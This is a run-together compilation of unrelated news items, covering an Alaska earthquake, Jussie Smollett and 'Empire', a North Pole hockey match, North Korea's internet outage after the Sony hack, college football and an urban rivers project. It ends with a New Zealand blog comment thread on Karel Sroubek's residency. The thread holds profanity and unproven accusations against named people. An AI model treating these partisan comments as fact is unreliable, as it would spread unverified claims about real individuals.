Alaska averages 40,000 earthquakes per year, with more large quakes than the 49 other states combined. Southern Alaska has a high risk of earthquakes because of tectonic plates sliding past each other under the region.
David Harper was getting some coffee at a store when the low rumble began and intensified into something that sounded “like the building was just going to fall apart.” Harper ran to the exit with other patrons there.
“The main thought that was going through my head as I was trying to get out the door was, ‘I want this to stop,’” he said. Harper said the quake was “significant enough that the people who were outside were actively hugging each other. You could tell that it was a bad one.”
On March 27, 1964, Alaska was hit by a magnitude 9.2 earthquake, the strongest recorded in U.S. history, centered about 75 miles (120 kilometers) east of Anchorage. The quake, which lasted about 4½ minutes, and the tsunami it triggered claimed about 130 lives.

Jussie Smollett Might Have Fate of 'Empire' Hanging in the Balance
Exclusive Details
Jussie Smollett's case could cost him way more than just his gig on "Empire" ... many on the show fear his situation could bring the whole show down in the process.
Production sources tell TMZ ... anxiety is high among the "Empire" cast and crew, because Fox has yet to renew the show for a sixth season. We're told people who've been working on the show for years are griping they should've heard the news one way or another by now, and expected to get word on the fate of the show around 2 weeks ago.
For the record ... Fox has typically renewed the show in January ... 5 months ahead of the season finale. The exception ... this past season. Fox waited until a few weeks before the season 4 finale was set to air ... in May.
We're told folks involved in the production feel like Jussie and his case will be a big factor in how things shake out.
As for how Jussie's character is being handled on the show now ... Lee Daniels and co. have already announced Jamal is being removed from the final two episodes of season 5, which is set to return from a hiatus on Wednesday night.
Our sources say Jussie's character will be "out of the country."
Here's the kicker ... our production sources tell us even if Fox does renew the show, higher-ups have expressed serious reservations about Jussie returning ... as have many folks on the cast and crew ... even some who have publicly supported him.

10 Oct 2018 Story Climate change
Sport, society and the environment team up for the Last Game at the North Pole
Photo by Axel Bastello Palais Princier
Pope Francis is the latest public figure to lend their support to the Last Game at the North Pole – an Arctic ice hockey match that aims to draw attention to the scary speed of climate change.
The Head of the Roman Catholic Church blessed the Last Game and accepted UN Environment’s invitation to serve as honorary captain for one of the hockey teams taking to the rink in April 2019. Pope Francis’ “counterpart” for the other team will be UN Secretary-General António Guterres.
“Presenting the Last Game to more non-Arctic globally-prominent personalities has confirmed that this project has universal attraction and can stimulate public action to fight climate change beyond the Arctic Circle,” said UN Environment Patron of the Polar Regions Vyacheslav Fetisov.
The Last Game was given a global platform last week, as Fetisov addressed delegates at a
Climate and Sport Summit in the margins of the UN General Assembly in New York. “How many people watched the World Cup? Almost 4 billion. It was the single most unifying common experience on the planet this year. So I decided to try to organize the first – and maybe the last – hockey game at the North Pole, to help unify the world and combat polar warming,” he explained.
“When we started, everyone said this was a crazy idea. But now we have the support of all the Artic countries – the United States, Canada, Russia, Norway, Finland, Denmark, Sweden and Iceland,” the legendary ice hockey player underlined.
While in New York, the UN Environment Patron of the Polar Regions met with Patricia Espinosa, the Executive Secretary of the United Nations Framework Convention on Climate Change, to discuss the promotion of The Last Game at December’s climate change conference in Katowice, Poland.
In another recent meeting with Slava Fetisov, Prince Albert of Monaco also spoke in favour of linking sport with environmental messaging. “Sport carries a universal language, federating peoples across cultures. Climate change needs to be brought to the attention of the greatest number of people,” reasoned Prince Albert, whose Principality of Monaco aims to be carbon-neutral by 2050. Prince Albert is himself a former Olympic athlete in bobsleigh and is chairing the Sustainability Commission of the International Olympic Committee.
The hockey match will take place at the ‘Barneo’ expedition camp, about 80 km from the North Pole. Athletes from all around the world, including all Arctic countries, are expected to take part in this unique event.
The Arctic is warming at twice the average rate of the rest of the planet and its summers may be almost ice-free by 2040. The Last Game aims to draw attention to the rapid speed of global warming and demonstrate its importance to the well-being of people across the world.

Tymoshenko denies Baloha’s accusations of provoking open conflict with President

“We achieved the democratic coalition through much suffering..."
BYuT front-runner, Prime Minister of Ukraine Yulia Tymoshenko denies the accusations of President’s Chief of Staff Victor Baloha of deliberate destroying the coalition and provoking an open conflict with President of Ukraine Victor Yushchenko.
According to an UNIAN correspondent, Yulia Tymoshenko claimed this to journalists today after the BYuT City Conference in Kyiv.
“The democratic coalition in the Verkhovna Rada is the result, achieved by the whole our team through much suffering. This is the team, which is able to change the country to better. I do appreciate the unity of the democratic coalition, and I will not allow that some functionaries and accidental people destroy this unity. Me personally, and our team, we are, without any doubt, devoted to the democratic unity”, Yulia Tymoshenko claimed.
The BYuT leader also ruled out the opportunity of re-formatting the parliamentary coalition into a coalition of BYuT and the Party of Regions.

Doctors remove 50-pound cyst from Alabama woman's ovary
By
Ben Hooper
(0)
June 29 (UPI) -- An Alabama woman who suffered months of unexplained medical problems finally has relief after doctors removed a 50-pound ovarian cyst.
Kayla Rahn, 30, of Montgomery, said she suffered months of problems including pain and weight gain, and medical professionals told her she'd feel better if she lost weight.
"I had been trying to lose weight for about a year, but I was gaining weight," Rahn told WSFA-TV.
Rahn said her issues got so out of control that people often asked if she was pregnant.
"I legit looked like I was a solid 9 months pregnant. We went to dinner and someone asked me if I was having twins. It was frustrating and rough," she said.
At one point in May, her mother took her to the Jackson Hospital emergency room in Montgomery, where a series of tests discovered the massive cyst on her ovary.
"I do remember telling my mom and busting out crying they were going to fix it. I knew something was wrong," Rahn said.
Dr. Gregory Jones, an OB-GYN at Jackson Hospital who was in the operating room, said the tumor, an instance of mucinous cystadenoma, was benign.
He said he was shocked by the size of the growth.
"This is one of the largest I have ever seen or certainly removed," Jones said. "We are very excited things went well for her."
The hospital applauded its medical team in a Facebook post.
"Thank you to our incredible doctors here at Jackson Hospital for helping this young lady get back on her feet after finding a 50 lb cyst in Kayla's ovaries," the post said.
"After Dr. Sample made the discovery, Dr. Seirafi and Dr. Jones were able to remove the cyst and got Kayla feeling much better. That's the Power of Jackson!" the hospital said.

By Guy Taylor - The Washington Times - Monday, December 22, 2014
The U.N. Security Council took the groundbreaking step of placing North Korea’s bleak human rights record in the official spotlight Monday, as speculation surged that Washington has now secretly hacked into — and effectively brought to a halt — Pyongyang’s Internet infrastructure in apparent retaliation for the Asian nation’s suspected cyberattack on Sony Pictures.
While President Obama said last week that the U.S. government would respond “proportionally” to the hacking of Sony’s internal records due to a controversial film, the White House and State Department declined to say whether Washington was responsible, as reports swirled Monday afternoon that North Korea was experiencing sweeping and progressively worse Internet outages.
The developments came after North Korea’s government issued a fiery statement on Sunday threatening unspecified attacks against “the whole of the U.S. mainland” — a significant escalation in tension between Pyongyang and the West that has come to define the bizarre circumstances surrounding Sony’s now-canceled comedy “The Interview.”
SEE ALSO: North Korea experiencing severe Internet outages
North Korea has denied carrying out last month’s cyberattacks linked to the film, a CIA comedy with a storyline centered around a fictional plot to assassinate North Korean leader Kim Jong-un.
But Pyongyang has also responded angrily to formal U.S. allegations that it was responsible. A statement carried by North Korean state media Sunday night warned that “the army and people of [North Korea] are fully ready to stand in confrontation with the U.S. in all war spaces, including cyberwarfare space.”
It was not immediately clear what specifically triggered the threat, although it came as the first reports of North Korea’s own Internet troubles began to surface over the weekend. News reports said Internet servers first began faltering in Pyongyang Friday night, and connectivity was spottier throughout the weekend until the nation was totally offline by Monday.
Cybersecurity analysts said it looked like a “distributed denial-of-service” attack occurred in North Korea, in which the network’s circuits are effectively overloaded by artificial web traffic until they collapse.
Doug Madory, the director of Internet analysis at Dyn Research, an Internet performance management company, told The New York Times the situation appeared to be “a DDoS attack.” As of Monday night, North Korean routers had effectively “left the global Internet, and they are gone until they come back,” the expert told The Associated Press.
According to Dyn Research, service was back up in North Korea on Tuesday morning after having been out for more than nine hours.
While the outage could have been caused by a more benign glitch, Mr. Madory said it appeared to be something more sinister. But with the Obama White House refusing to comment, he stopped short of calling a definite cyberattack from an outside actor such as the U.S. government.
The FBI said Friday that it has “enough information to conclude” that the North Korean government was behind a late-November attack on Sony Pictures Entertainment that leaked internal company documents, personal emails and even upcoming films. President Obama asserted Friday that Washington was preparing to take action in response.
But Mr. Obama provided no details on what exactly was being planned.
Speculation
The U.S. government regards its offensive cyberoperations as highly classified, and a spokeswoman for the National Security Council at the White House pointedly declined to say whether Washington was responsible.
“We have no new information to share regarding North Korea today,” said NSC spokeswoman Bernadette Meehan. “If in fact North Korea’s Internet has gone down, we’d refer you to that government for comment.”
But officials at the State Department appeared almost eager to keep the speculation alive. “We aren’t going to discuss … publicly operational details about the possible response options or comment on those kind of reports in any way except to say that as we implement our responses, some will be seen, some may not be seen,” said deputy department spokeswoman Marie Harf.
Separately, Ms. Harf suggested U.S. officials praised the timing of the U.N. Security Council’s announcement on Monday to move toward potentially holding leaders of the nuclear-armed but desperately poor nation of some 25 million people accountable for crimes against humanity.
The Security Council move, angrily denounced by Pyongyang, was related to the cyberattack developments in timing only. But Ms. Harf called it “historic” and indicative of the international community’s wider concern about human rights in North Korea.
While the Security Council has had North Korea’s nuclear program on its agenda for years, Monday’s session opens the door to a wider discussion of abuses by the regime. The council moved to officially open debate on the matter following a vote last week in which 116 nations of the U.N. General Assembly supported a resolution accusing North Korea of committing crimes against humanity.
“Today, we have broken the council’s silence. We have begun to shine a light, and what it has revealed is terrifying,” U.S. Ambassador to the U.N. Samantha Power said.
The development comes amid mounting international concern over North Korea following a February report by the U.N. Human Rights Council that leveled withering criticism against leaders in Pyongyang.
The rights panel estimated that up to 120,000 political prisoners were being detained in four prison camps in North Korea, where deliberate starvation has been used as a means of control and punishment, according to a recent report by USA Today.
The U.N. report, the newspaper said, concluded that “crimes against humanity” committed by North Korean leaders have included “extermination, murder, enslavement, torture, imprisonment, rape, forced abortions and other sexual violence, persecution on political, religious, racial and gender grounds, the forcible transfer of populations, the enforced disappearance of persons and the inhumane act of knowingly causing prolonged starvation.”
The U.N. General Assembly has since urged the 15-member Security Council to refer North Korea’s human rights situation to the International Criminal Court. But it remains to be seen when or whether such a referral may come.
Just the potential for a referral has prompted heated threats from North Korea. Pyongyang sent a sharp warning last month that it would conduct nuclear weapons tests after it became clear the issue may advance to the Security Council.
China and Russia protested Monday’s developments by the Security Council. Both have veto power as permanent council members and could block any eventual U.N. action against North Korea.
The council “should refrain from doing anything that might cause the escalation of tensions,” China’s U.N. ambassador, Liu Jieyi, told the session.
Two-thirds of the Security Council this month formally requested that North Korea’s human rights situation be placed on the agenda, saying rights violations “threaten to have a destabilizing impact” on the region.
U.N. Secretary-General Ban Ki-moon, who is South Korean, told reporters Monday that human rights should be given the “highest priority” in any country.
Sony last week canceled the Christmas Day release of “The Interview,” setting off alarm among some diplomats and entertainment figures, who warned of setting a precedent for backing down in the face of future threats. President Obama himself criticized the company for canceling the film’s distribution.

By DAVE SKRETTA - Associated Press - Wednesday, September 17, 2014
MANHATTAN, Kan. (AP) - Kansas State coach Bill Snyder was busy revolutionizing the spread offense, and the idea of a run-pass quarterback, at college football’s highest level during the 1990s.
Gus Malzahn was watching it all transpire while coaching high schools in Arkansas.
On Thursday night, two of the most innovative coaches of their respective generations will match wits under the lights with a national TV audience. Malzahn is coaching fifth-ranked Auburn (2-0) these days, and the Tigers will be visiting the No. 20 Wildcats (2-0) for a non-conference showdown.
“Being a high school coach way back when, I had a lot of respect for him, the way he’s built the program,” Malzahn said of the 74-year-old Snyder, the seemingly ageless wonder who returned from a brief retirement a few years ago to rebuild the program that he first put on the map.
“I think he’s one of the better coaches to ever walk the planet,” Malzahn added. “You can turn on the game film and you can see why. They execute offense and defense and the special teams, and they get the most out of their players. That’s what really stands out to me.”
What stands out to Snyder is the similarity in their offenses.
Both feature an athletic quarterback. Both use elements of the read-option, and then create a variety of looks from the same basic sets. And both have proven that the run game is still a vital part of success in an era of pass-happy offenses.
“They are still a pretty broad package in regards to their offense, which is similar to us,” Snyder said. “Your preparation has to be broad-based as well and be prepared for all of it.”
That preparation should be somewhat easy for both teams.
Since they share so many similarities, Kansas State and Auburn has easily replicated their opponent in practice the past few weeks.
The Wildcats have been able to mimic the flashy running style of Tigers quarterback Nick Marshall and the up-tempo, no-huddle approach that carried Auburn to the national title game last year. The Tigers have been able to break down and impersonate Wildcats quarterback Jake Waters, one of the most accurate passers in major college football.
“We definitely respect them,” Waters said, “but we also know that they are trying to come in here and smack us around and beat us. We have to have that same attitude and that confidence that we can play with anyone in the country. We respect them but we’re not scared of them.”
In a game that could have significant ramifications for the new college football playoff, here are a few things to watch for when Auburn visits Kansas State on Thursday night:
LOCKETT VS COATES: Auburn wide receiver Sammie Coates, who has been limited by a knee injury, is big and physical. Kansas State’s Tyler Lockett, who has been limited by a balky hamstring, is speedy and elusive. Both are expected to play significant roles in the game. And Auburn’s secondary will be depleted. Safety Jermaine Whitehead will miss the game because of a violation of team rules.
RODNEY DANGERFIELDS: Auburn doesn’t believe it’s received the respect typically showered on defending SEC champions. Kansas State has played the no-respect card every year that Snyder has prowled the sidelines. “We’ve always played with a chip on our shoulder,” Auburn linebacker Kris Frost said. “I don’t ever think that’s going to change.”
GETTING SPECIAL: With so many similarities between Snyder and Malzahn, it makes sense that both programs would value special teams. The Wildcats routinely score on kickoff and punt returns, and it was a dramatic return of a missed field goal against Alabama last season that helped boost the Tigers into the SEC title game. “We’ve worked extremely hard the last week-and-a-half on special teams,” Malzahn acknowledged. “I think that will be a big factor.”
BIG STAKES: Both teams can rack up some early style points with the new playoff committee with a marquee non-conference win. Perhaps more importantly, both can build some momentum for the rest of the season. “The whole world is watching,” Auburn defensive tackle Gabe Wright said.
STAYING LOOSE: With so much on the line, staying loose could prove difficult. Kansas State hasn’t faced a top-five, non-conference team at home since 1969, while the Tigers will be playing on the road for the first time this season. “Someone told me that’s the only game going on that day,” Wildcats wide receiver Deante Burton said. “It’s a game you dream about.”

Mainstreaming Biodiversity and Ecosystem Services in Addis Ababa, Dar es Salaam and Lilongwe
Key points:
The adaptation of urban riverine ecosystems is essential to build resilience to droughts and flooding and to improve the well-being of those reliant on the rivers for their livelihood.
The aim of the project is to mainstream biodiversity and ecosystem services into urban planning and local government decision-making processes, promoting the socio-economic importance of biodiversity and ecosystem services.
The coordination and engagement of key stakeholders is vital to mainstreaming and knowledge sharing, there has to be successful involvement of the local communities in order for the projects to be sustainable and successful.
Introduction
The ecological components of urbanised environments, and the adaptation of these landscapes to meet human needs in city regions have long been focal points of discussion for policy-makers, urban planners and other relevant actors in these transformative processes. Local Governments for Sustainability Cities Biodiversity Center (ICLEI), together with project partners, designed the Urban Natural Assets: Rivers for Life (UNA Rivers) project to approach this issue with a special focus on urban river systems in three target cities: Addis Ababa, Dar es Salaam and Lilongwe.
The goal is to mainstream biodiversity and ecosystem services (the processes by which the environment produces resources such as clean air, water, food and materials) into land-use planning and local government decision-making processes. The project also aims to contribute to an enhanced understanding of the socio-economic importance of biodiversity and ecosystem services, and to facilitate the use of new understanding into strategic climate change adaptation plans.
Urban Natural Assets for Africa Rivers for Life (UNA Rivers) furthermore improves coordination and engagement within the project cities (between departments and key stakeholders: Community-based Organisations (CBO’s), NGOs, researchers, communities (inter alia) as well as between cities. Lastly, through locally appropriate, scalable project implementation (with a specific focus on community-based art and culture activation), the project successfully connects people living in urban communities to biodiversity and ecosystems within an urban river context, enhancing overall human well being.
Climate risks and other stressors
Typical climate hazards associated with riverine ecosystems are the impacts of flooding and drought, both likely to deteriorate the existing biodiversity, and to threaten the livelihoods of the people living nearby. Building resilience at the local level by managing the natural asset base and restoring riverine ecosystems can help confront these natural hazards.
Adaptation approach
By sustainably managing and restoring rivers and riverine ecosystems in three African cities, this project aimed to protect natural ecosystems so that the natural asset base is maintained for cities to better adapt to climate change. UNA Rivers adopted certain measures with an ecosystem-based approach to attain their goals. This approach involved mapping the existing natural assets in the three target cities, and then sharing the capacity-building potential of the mapped information with key decision makers. As a result, land-use planning incorporated biodiversity and ecosystem services into the process, with the aim of better guiding policy and planning systems. In addition, on-the-ground engagement promoted coordination of key role-players in managing urban rivers. Then, pilot riverine ecosystem restoration measures were implemented.
Link to SDGs
This project primarily aligns with SDG Goal 15 through protecting, restoring and promoting the sustainable use of terrestrial ecosystems. Through better coordination and community-based activation, the project contributes to strengthening sustainability and resilience at the local level, thus enhancing human well-being and poverty alleviation (SDG 3).
Challenges
Through an intensive consultation during the planning phase of the project, important relationships were built that led to increased access to relevant information, and to enhanced understanding of the governance structures in the project cities. Understanding these structures proved crucial in mainstreaming information, and overcoming barriers.
Benefits
Substantial benefits can result from the ecosystem-based approach presented here. Through better coordination and community-based activation, resilience at the local level can be strengthened and human well-being can be enhanced. Understanding the decision-making processes in the project cities, and improving the co-ordination of key stakeholders is essential for the transformation needed to build resilience. Improved information helps to provide much needed links between decision-makers and technical officials in the cities, enabling cities to better protect and manage riverine environments.
Lessons Learnt
Several key lessons emerged from the implementation of the project. To identify entry points to mainstream information, it is important to understand the city context, the official and unofficial governance structure, and the roles played by key decision-makers. There is still a major need for implementation-oriented pilot projects that introduce innovative ideas, and push for a change in the use of urban ecosystems.
Also, co-ordination of environmental protection interventions in African cities is still widely lacking. Improved coordination leads to knowledge and lesson-sharing, and therefore eventually accelerates adaptation activities. Projects should be aligned with city needs and policies, and to that end, projects should be co-produced with relevant decision makers, such as city officials.

The North American Leaders' Summit First Annual Stakeholder Dialogue
The North American Leaders' Summit First Annual Stakeholder Dialogue
The Woodrow Wilson Center, led by its Mexico and Canada Institutes, hosted the first annual Stakeholder Dialogue on North American Competitiveness on September 29, 2016. The Dialogue had been announced by the three North American leaders three months earlier at the North American Leaders Summit (NALS) held in Ottawa.
A group of individuals from a diverse mix of organizations met in this first Stakeholder Dialogue with the goal of informing and shaping the agenda of the next North American Leaders’ Summit. With this launch, the Stakeholder Dialogue became a formal part of the NALS process.
This first Stakeholder Dialogue is but the first of many activities that the Wilson Center intends to organize to provide ongoing input from non-governmental stakeholders into the NALS agenda. This page on the Woodrow Wilson Center’s web site will serve as our information central during this effort.
Canadian and Mexican officials have expressed their intention to spur similar stakeholder events in their respective countries. We will provide information on NALS stakeholder activities in all three countries as they are announced.
A comments section is included here to provide a dynamic platform for ongoing discussion and input from those interested in developing greater competitiveness in North America. All are encouraged to submit their comments and ideas.
A summary of the discussions that include Issues and Recomendations from the first annual Stakeholder Dialogue held on September 29, 2016 can be found here.

More ‘new information’ that prompted reconsideration of Sroubek residency
A report that there was more new information that prompted a reconsideration of the Sroubrek residency decision than that he had returned voluntarily to the Czech republic.

Newstalk ZB: Details surrounding Karel Sroubek’s residency revealed
Yesterday, Newstalk ZB revealed Sroubek had allegedly returned to the Czech Republic since arriving to New Zealand, which went against the suggestion the residency was for his protection.
Newstalk ZB can exclusively reveal the change in circumstance that could see controversial criminal Karel Sroubek lose his residency.
Newstalk ZB political editor Barry Soper understands the new information, which has sparked the change of heart, centres on Sroubek’s now ex-wife.
Initially, she supported Sroubek’s case for residency and said she was happy for him to stay in the country once he was released from jail, where he is currently serving a sentence for importing drugs.
This is believed to be the information Lees-Galloway used to make his decision.
However, the wife is now in the process of taking out a restraining order against Sroubek.
The decision came as news to Lees-Galloway, and he is now reviewing his decision.

When is the PM going to report back on the Meka Whaitiri leak, you remember the one that jumped the gun and was going to be held back the three weeks it was going to take to remove any hints on who was hurt.

Simon’s expenses leak is still unresolved, Ray. He believed it terribly important, but hasn’t definitively answered the whodunit. Must have cost a pretty penny, that witch-hunt of his. All for nought.

Simon’s expenses leak is still unresolved, Ray.
Nah, personally, robert, I reckon it pretty much is.
robertguyton
/ November 1, 2018
To whose satisfaction? Certainly not a judges. Simon’s, maybe, but he’s got skin in the game. Innocent till proven, I reckon. Not that it matters. It was a minor issue of no real interest. Or far greater interest to me was the sight revealed when the curtain was drawn back a little, in the Nat’s changing room. Pants all around ankles.
Gezza

To mine and I think probably to National’s caucus and the party hierarchy. They might keep scanning quietly for other malignant echos but I reckon they got the right cuckoo. Naturally you will be automatically peeing yourself with unrestrained glee at the exposure of your enemies’ undies.

Simon’s expenses were never an issue Robert. Even Jacinda said it was a ridiculous beat up. The only issue with the expenses was the early leak.
Are you thinking of the donations? That is a non-issue in my eyes, but it is still unresolved as the police are looking into it.
High Flying Duck
/ November 1, 2018
It was released at the beginning of October Ray:
A redacted version of a report into an allegation of staff bullying against former government minister Meka Whaitiri has finally been released.
The report, by Wellington lawyer David Patten, confirms what was said in a Herald report which said the new staff member was left with bruising after the encounter with Whaitiri at an event attended by Prime Minister Jacinda Ardern in Gisborne on August 27.
“After giving careful consideration to this matter, it is my view that the explanation provided to me by Employee A is a more probable explanation as to what happened than the explanation provided to me by the Minister. That is, rather than the encounter between the two of them in the foyer being a face to face encounter as described to me by the Minister, the Minister in fact approached Employee A from slightly behind and grabbed Employee A by the arm,” Patten said in the report.

That is the Report HFD, stil not sure why it would take three weeks to make sure Employee A would have their privacy concerns covered.

6- Andy.
7- Davis.
Gezza
/ November 1, 2018
Andy got made a wally of by Winston over announcing the government intended repealing the 3 strikes law. But to be honest, anyone can be the victim of treachery – after being misled by Winnie for a headline – at any time – and Little seems to be doing ok in other areas so far.
(Apart from wasting a fucking fortune on a champagne & caviar Crime Solutions Talk Fest that was a further embarrassment he’s admitted to – & ritually slagged off his officials for, in the time-honoured tradition of most Ministers in trouble. It likely won’t happen again. And it probably WAS their fault. They’re the ones who most often completely ignore that they’re spending the taxpayer’s dollars.)
I think he’ll end up doing well or at least be generally well-regarded by the great unwashed swing voters, the likely key to the universe next election.

So is the foreign multable sex offender allowed to stay here by National still here and has he raped another New Zealander asking for a friend
High Flying Duck
/ November 1, 2018
Was there one? That Woodhouse allowed to stay?
Blazer
/ November 1, 2018
Woodhouse overturned 108 deportation orders…no doubt with good reason,relying on information he had at the time.
High Flying Duck
/ November 1, 2018
And none have come back to bite him, so he probably did his job properly.
This case is a debacle and ILG went against the advice from a number of Justice agencies in making his decision. We could still be missing something of course, but it seems like an out and out cock up at this stage.
duperez
/ November 1, 2018
Some of the fuss is the danger that Sroubek is likely to pose. Separating any fear from the politics is hard.
One person allowed to remain under Woodhouse’s watch went to prison for kidnapping and indecently assaulting a six-year-old girl. I wonder if those fuming at the danger of Sroubek are concerned about that.
Another one: In February 2013 Sultan Ali Abdul Ali Akbari indecently assaulted a woman and was convicted.
In 2015 he was jailed for two years and one month for five charges of indecent acts on girls aged 8 and 10 and indecently assaulting an 18-year-old.
That offending happened while Akbari was on bail awaiting trial on the 2013 charge.
Immigration New Zealand granted him deportation liability suspension.
That meant he coukldn’t be deported for five years and that decision would only be reviewed if he was convicted of a new offence.
Michael Woodhouse met with Immigration New Zealand to discuss a parole change for that individual after further fears for public safety but didn’t seek a review of the deportation liability suspension.
https://www.nzherald.co.nz/nz/news/article.cfm?c_id=1&objectid=11848738
The job of Michael Woodhouse is politics and that is what he is playing. Those who proclaim the danger of Sroubek and the processes of Lees-Galloway while not having reservations about the decision making of Woodhouse are the same.
High Flying Duck
/ November 1, 2018
That’s accurate Parti, other than the fact Woodhouse was prevented by law from reviewing or overturning the decisions made by officials.
He did however suspend their decision making powers to ensure better decisions were made in the future.

Does this mean at the next election you will be voting against the Party whose Minister allowed him to stay, Lurchy? Two votes for the reprehensible Winnie’s crew next time, perhaps?

A small number of cock-upsby relatively new Ministers are generally forgiveable by the great unwashed early in the piece – as long as there’s not also string of them in the lead-up to an election.

PartisanZ

The “more new information” referred to is simply public backlash, surely?
The worst thing about this is that it looks like what the Key National government did SO MANY TIMES!
Backtrack follows backlash …
I guess that’s normal and human?
But where’s the considered decision-making to begin with?
Gezza
/ November 1, 2018
No. There is reference above to significant new information by his wife, which you must have read, surely? There was also reference by National yesterday on Te News to some evidence that despite supposedly being in fear of his life should he return to the Czech Republic, he has actually been back there.
It might pay to wait for more to come out – but I think your transumption that it is only public backlash that is the new information is ill-conceived and driven perhaps by various prejudicial worldviews.
It is unlikely Lees-Galloway would be bothered by public backlash when he went against virulently anti-free speech lefties to allow Molyneux and Southern to come here and be abused.
Alan Wilkinson
/ November 1, 2018
I wouldn’t have thought so. The backlash was surely predictable. Discovering he had been back to the country he was supposedly at risk from and that his wife was taking out a restraining order against him – apparently not so much.
Gezza
/ November 1, 2018
Surely PZ would have read the post without just rushing to post a comment with no fucking clue what it was about?
Dave K

I’m surprised PZ didn’t wheel out the old “Codswallop” again like a couple of days ago.
FMS I laughed at that. It’s the 21st century boss…we’ve got electricity, new words and don’t even have to write with quills anymore. The only person I knew who called codswallop on things was my great aunt who is tucked up in Ryman now quiety dribbling in the corner. Same demographic I guess….

I’ve definitely deployed codswallop on appropriate occasions though currently have a preference for b>claptrap. Depends on how pretentious the target is.

Oops, typing with a bandaged finger isn’t conducive to html accuracy.
Kitty Catkin

I like the word codswallop; it just sounds like what is is. ‘What a load of codswallop.’ Balderdash and claptrap are classics, too, some things never change.
Cobblers is less refined, but very expressive.
robertguyton

Kitty – you clearly don’t know what “codswallop” refers to, or at least the best interpretation of the word. Isn’t Captain Pugwash a character and a half!
Kitty Catkin

Codswallop doesn’t have an obscene origin, if that’s what you’re getting at. You may be confusing it with poppycock.

Don’t tempt me to say it.
High Flying Duck
/ November 1, 2018
Not sure what the Espiner interview was about, but Immigration officials have confirmed they never brought up Sroubek with any previous minister before ILG, so Woodhouse had no opportunity to do anything about it.
The guy came in to NZ under a false passport while Labour were in. He was discharged without conviction for a crime while National were in which didn’t trigger deportation reviews, and the shit hit the fan…this week.
robertguyton
/ November 1, 2018
His country hadn’t requested extradition.
That’s all.
High Flying Duck
/ November 1, 2018
Extradition now? Labour have denied that is the case, although others have reported that extradition has been requested.
When National’s Justice spokesman Mark Mitchell asked Justice Minister Andrew Little if there was an extradition request for outstanding criminal proceedings against Sroubek, he replied: “No”.
” … The fact of the matter is there has been no extradition request from the Czech Republic to New Zealand in relation to Mr Sroubek’. (Little said)
Who knows what tomorrows story will be eh?
But Woodhouse couldn’t do anything about a person he had no idea existed.
ILG probably should have thought twice about a gang banging drug dealer in jail as being the ideal new citizen.
Jacinda also didn’t exactly cover herself in glory by saying “if he offends again it is on him, not us!”.
Kitty Catkin
/ November 1, 2018
There’s no answer to that, is there?
robertguyton
/ November 1, 2018
“others have reported that extradition has been requested.”
Who?
Was it backed by… evidence??
Nope.
High Flying Duck
/ November 1, 2018
“The Parole Board also noted Sroubek’s close association with the Hells Angels and that the Czech Republic were still seeking his extradition, which had been on hold until a decision had been made on deportation.
While it hasn’t been explicitly stated by Immigration Minister Lees-Galloway, it seems he was persuaded to cancel the deportation of Sroubek because of his evidence about why he fled from the Czech Republic.”
High Flying Duck
/ November 1, 2018
“National leader Simon Bridges also asked why the Government was ignoring the Czech Republic’s request for extradition.
Peters’ response cited privacy provisions in the interests of the safety of others.”

Never an Emmerson fan but a) the Minister’s not in a corner since he’s reviewing the decision and b) his department overlooked the pertinent facts they should have known and caused the SNAFU.
So apart from getting everything wrong as usual it’s a good cartoon.

criminals and con artists must think NZ is a real sleepy backwater..when it comes to PR.
Standard claim..I will be persecuted/killed if you send me back..ignore the circumstance of my arrival..both National and Labour are guilty of inconsistent application of deportation orders.
